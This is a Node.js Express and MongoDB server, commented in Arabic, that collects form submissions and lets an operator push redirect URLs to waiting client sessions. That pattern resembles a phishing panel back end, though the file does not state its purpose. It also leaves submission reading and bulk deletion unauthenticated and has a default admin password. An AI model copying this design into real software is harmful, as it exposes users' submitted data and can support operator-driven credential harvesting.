/**
 * خادم Express + MongoDB (Mongoose) لتخزين تسجيلات النماذج وخدمة الداشبورد.
 * شغّل من مجلد server: npm install && npm start
 * ثم افتح الموقع من: http://localhost:3000/ (الملفات الثابتة تُخدم من جذر المشروع)
 */
require('dotenv').config();
const path = require('path');
const express = require('express');
const cors = require('cors');
const mongoose = require('mongoose');

const PORT = process.env.PORT || 3000;
const ADMIN_CONFIG_PASSWORD = process.env.ADMIN_CONFIG_PASSWORD || 'change-me-now';
const BOOT_DEFAULT_APP_KEY = process.env.DEFAULT_APP_KEY || 'yasmeen';
const SINGLE_URI = process.env.MONGODB_URI || 'mongodb://127.0.0.1:27017/yasmeen';

function parseUriMap() {
    const raw = process.env.MONGODB_URI_MAP;
    if (!raw || !raw.trim()) {
        return { [BOOT_DEFAULT_APP_KEY]: SINGLE_URI };
    }
    try {
        const parsed = JSON.parse(raw);
        if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
            throw new Error('MONGODB_URI_MAP يجب أن يكون JSON object');
        }
        return parsed;
    } catch (err) {
        console.error('خطأ في MONGODB_URI_MAP:', err.message);
        process.exit(1);
    }
}

let runtimeDefaultAppKey = BOOT_DEFAULT_APP_KEY;
let runtimeUriMap = parseUriMap();

const submissionSchema = new mongoose.Schema(
    {},
    { strict: false, timestamps: true, collection: 'submissions' }
);

const sessionNavSchema = new mongoose.Schema(
    {
        client_session_id: { type: String, required: true },
        redirectUrl: { type: String, required: true }
    },
    { timestamps: true, collection: 'session_nav' }
);
sessionNavSchema.index({ client_session_id: 1 }, { unique: true });

const connections = new Map();
const models = new Map();

function getAllowedAppKeys() {
    return Object.keys(runtimeUriMap);
}

function getSessionNavModel(conn) {
    if (conn.models.SessionNav) return conn.models.SessionNav;
    return conn.model('SessionNav', sessionNavSchema);
}

async function ensureAppModel(appKey) {
    if (models.has(appKey)) return models.get(appKey);
    const uri = runtimeUriMap[appKey];
    if (!uri) return null;
    const conn = await mongoose.createConnection(uri).asPromise();
    connections.set(appKey, conn);
    const model = conn.model('Submission', submissionSchema);
    getSessionNavModel(conn);
    models.set(appKey, model);
    return model;
}

async function reconnectAll() {
    for (const conn of connections.values()) {
        try {
            await conn.close();
        } catch (e) {
            console.error('تعذر إغلاق اتصال قديم:', e.message);
        }
    }
    connections.clear();
    models.clear();
    for (const appKey of getAllowedAppKeys()) {
        await ensureAppModel(appKey);
    }
}

function resolveAppKey(req) {
    const keyFromHeader = req.header('x-app-key');
    const keyFromQuery = req.query.appKey;
    const key = (keyFromHeader || keyFromQuery || runtimeDefaultAppKey || '').trim();
    return key;
}

function requireConfigAdmin(req, res, next) {
    const pass = (req.header('x-admin-password') || '').trim();
    if (!pass || pass !== ADMIN_CONFIG_PASSWORD) {
        return res.status(401).json({ error: 'غير مصرح' });
    }
    next();
}

function serialize(doc) {
    const o = typeof doc.toObject === 'function' ? doc.toObject() : { ...doc };
    if (o._id != null) {
        o.id = String(o._id);
        delete o._id;
    }
    delete o.__v;
    return o;
}

const app = express();
app.use(cors());
app.use(express.json({ limit: '512kb' }));

const publicDir = path.join(__dirname, '..');
app.use(express.static(publicDir));

app.get('/api/admin/db-config', requireConfigAdmin, (req, res) => {
    const currentUri = runtimeUriMap[runtimeDefaultAppKey] || '';
    res.json({
        defaultAppKey: runtimeDefaultAppKey,
        mongodbUri: currentUri,
        allowedAppKeys: getAllowedAppKeys()
    });
});

app.put('/api/admin/db-config', requireConfigAdmin, async (req, res) => {
    try {
        const defaultAppKey = String(req.body.defaultAppKey || '').trim();
        const mongodbUri = String(req.body.mongodbUri || '').trim();
        if (!defaultAppKey) {
            return res.status(400).json({ error: 'defaultAppKey مطلوب' });
        }
        if (!mongodbUri) {
            return res.status(400).json({ error: 'mongodbUri مطلوب' });
        }
        runtimeDefaultAppKey = defaultAppKey;
        runtimeUriMap = { [defaultAppKey]: mongodbUri };
        await reconnectAll();
        res.json({
            ok: true,
            defaultAppKey: runtimeDefaultAppKey,
            allowedAppKeys: getAllowedAppKeys()
        });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'فشل تحديث إعدادات قاعدة البيانات' });
    }
});

app.use(async (req, res, next) => {
    try {
        const appKey = resolveAppKey(req);
        if (!runtimeUriMap[appKey]) {
            return res.status(400).json({
                error: 'appKey غير معروف',
                appKey,
                allowedAppKeys: getAllowedAppKeys()
            });
        }
        const Submission = await ensureAppModel(appKey);
        if (!Submission) {
            return res.status(500).json({ error: 'تعذر تجهيز الاتصال بقاعدة البيانات' });
        }
        const conn = connections.get(appKey);
        req.appKey = appKey;
        req.Submission = Submission;
        req.SessionNav = conn ? getSessionNavModel(conn) : null;
        next();
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'فشل الاتصال بقاعدة البيانات' });
    }
});

app.get('/api/health', (req, res) => {
    const appKey = req.appKey || runtimeDefaultAppKey;
    const conn = connections.get(appKey);
    const ok = !!conn && conn.readyState === 1;
    res.status(ok ? 200 : 503).json({ ok, mongo: ok, appKey, allowedAppKeys: getAllowedAppKeys() });
});

/** انتظار المشرف: تعيين صفحة للمستخدم حسب client_session_id */
app.post('/api/session/nav', async (req, res) => {
    try {
        if (!req.SessionNav) {
            return res.status(500).json({ error: 'تعذر تهيئة نموذج التوجيه' });
        }
        const client_session_id = String(req.body.client_session_id || '').trim();
        const redirectUrl = String(req.body.redirectUrl || req.body.url || '').trim();
        if (!client_session_id || !redirectUrl) {
            return res.status(400).json({ error: 'client_session_id و redirectUrl مطلوبان' });
        }
        await req.SessionNav.findOneAndUpdate(
            { client_session_id },
            { client_session_id, redirectUrl },
            { upsert: true, new: true }
        );
        res.json({ ok: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'فشل حفظ أمر التوجيه' });
    }
});

/** استهلاك لمرة واحدة: المستخدم يستطلع حتى يُعاد التوجيه */
app.get('/api/session/nav/poll', async (req, res) => {
    try {
        if (!req.SessionNav) {
            return res.status(500).json({ error: 'تعذر تهيئة نموذج التوجيه' });
        }
        const client_session_id = String(req.query.client_session_id || '').trim();
        if (!client_session_id) {
            return res.status(400).json({ error: 'client_session_id مطلوب' });
        }
        const doc = await req.SessionNav.findOneAndDelete({ client_session_id });
        if (!doc) {
            return res.json({});
        }
        res.json({ redirectUrl: doc.redirectUrl });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'فشل الاستطلاع' });
    }
});

app.get('/api/submissions', async (req, res) => {
    try {
        const docs = await req.Submission.find().sort({ createdAt: -1 }).lean();
        res.json(docs.map(serialize));
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'فشل قراءة التسجيلات' });
    }
});

app.post('/api/submissions', async (req, res) => {
    try {
        const body = { ...req.body };
        delete body.id;
        delete body._id;
        const doc = await req.Submission.create(body);
        res.status(201).json(serialize(doc));
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'فشل حفظ التسجيل' });
    }
});

app.delete('/api/submissions/:id', async (req, res) => {
    try {
        if (!mongoose.isValidObjectId(req.params.id)) {
            return res.status(400).json({ error: 'معرّف غير صالح' });
        }
        await req.Submission.findByIdAndDelete(req.params.id);
        res.json({ ok: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'فشل الحذف' });
    }
});

app.delete('/api/submissions', async (req, res) => {
    try {
        await req.Submission.deleteMany({});
        res.json({ ok: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: 'فشل حذف الكل' });
    }
});

async function start() {
    try {
        await reconnectAll();
        for (const appKey of getAllowedAppKeys()) {
            await ensureAppModel(appKey);
            console.log(`متصل بقاعدة appKey=${appKey}`);
        }
    } catch (err) {
        console.error('فشل الاتصال بإحدى قواعد MongoDB:', err.message);
        console.error('تحقق من MONGODB_URI أو MONGODB_URI_MAP داخل ملف .env');
        process.exit(1);
    }

    app.listen(PORT, '0.0.0.0', () => {
        console.log(`الخادم يعمل على المنفذ ${PORT}`);
        console.log(`الملفات من: ${publicDir}`);
        console.log(`app keys المتاحة: ${getAllowedAppKeys().join(', ')}`);
    });
}

start();
